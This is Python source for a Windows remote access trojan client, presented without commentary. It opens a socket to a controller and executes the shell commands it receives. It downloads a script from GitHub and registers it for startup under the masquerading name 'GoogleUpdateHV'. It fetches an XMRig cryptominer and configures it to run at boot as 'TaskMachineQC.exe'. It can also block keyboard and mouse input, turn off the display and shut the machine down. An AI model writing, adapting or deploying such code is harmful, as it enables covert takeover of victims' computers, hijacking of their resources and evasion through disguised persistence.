from ctypes import windll
import socket,subprocess,os,getpass,urllib.request,win32api,win32con,ctypes

#Globals
IP = "127.0.0.1"
PORT = 8888
DATA = 16384
WM_SYSCOMMAND = 274
HWND_BROADCAST = 65535
SC_MONITORPOWER = 61808
user = getpass.getuser()
CopiedPath = (f"C:/Users/{user}/AppData/Roaming/GoogleUpdate/GoogleUpdateHV.py")
CopiedPath2 = (f"C:/Users/{user}/AppData/Roaming/TaskMachine/TaskMachineQC.exe")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

def persist():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate'))
    url = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/ggg3s.py"
    filename = os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate/GoogleUpdateHV.py')
    urllib.request.urlretrieve(url, filename)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + filename, shell=True)

def volumeup():
    win32api.keybd_event(win32con.VK_VOLUME_UP, 2)

def volumedown():
    win32api.keybd_event(win32con.VK_VOLUME_DOWN, 2)
    
def shutdown():
    os.system("shutdown -s -t 60")

def mine():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine'))
    url = "https://github.com/srpentesters/ggg3s/blob/main/xmrig.exe?raw=true"
    url2 = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/config.json"
    filenamem = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/TaskMachineQC.exe')
    filename2m = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/config.json')
    urllib.request.urlretrieve(url, filenamem)
    urllib.request.urlretrieve(url2, filename2m)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskmachineQC /t REG_SZ /d ' + filenamem, shell=True)

def parse_commands(data):
    available_commands = ['cd','persist','mine','dir','cd','exit','volup','voldown','shutdown','unblockinput','blockinput','displayoff']
    command = data[:].decode("utf-8").split()[0]
    if command not in available_commands:
        return("[!] Command not recognized") + "\n"
    if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8"))>0:
        try:
            os.chdir(data[3:].decode("utf-8"))
            return "[*] Changed directory to: " + os.getcwd() + "\n"
        except Exception as e:
            return "[!] Error changing directory: " + str(e) + "\n"
    elif data[:7].decode("utf-8") == "persist":
        persist()
        return "[*] Persistent File Added In: " + CopiedPath + "\n"
    elif data[:10].decode("utf-8") == "displayoff":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            return "[*] Turned Off Clients Display."
        else:
            return "[!] User Doesnt Have Admin Rights."+ "\n"
    elif data[:4].decode("utf-8") == "mine":
        mine()
        return "[*] Miner Added To Startup In: " + CopiedPath2 + "\n"
    elif data[:5].decode("utf-8") == "volup":
        volumeup()
        return "[*] Increased Volume Level By 2 Percent." + "\n"
    elif data[:7].decode("utf-8") == "voldown":
        volumedown()
        return "[*] Decreased Volume Level By 2 Percent." + "\n"
    elif data[:8].decode("utf-8") == "shutdown":
        shutdown()
        return "[*] Client Machine Will Shutdown In 60 Seconds." + "\n"
    elif data[:10].decode("utf-8") == "blockinput":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            windll.user32.BlockInput(True)
            return "[*] Successfully Blocked Clients Input" + "\n"
        else:
            return "[!] User Doesnt Have Admin Rights." + "\n"
    elif data[:12].decode("utf-8") == "unblockinput":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            windll.user32.BlockInput(False)
            return "[*] Successfully Unblocked Clients Input." + "\n"
        else:
            return "[!] User Doesnt Have Admin Rights." + "\n"
    try:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        return output_str
    except Exception as e:
        return "[!] Error running command: " + str(e) + "\n"

while True:
    data = s.recv(DATA)
    if not data:
        s.send(str.encode("[!] No data received"))
        break
    else:
        result = parse_commands(data)
        s.send(str.encode(result))
s.close()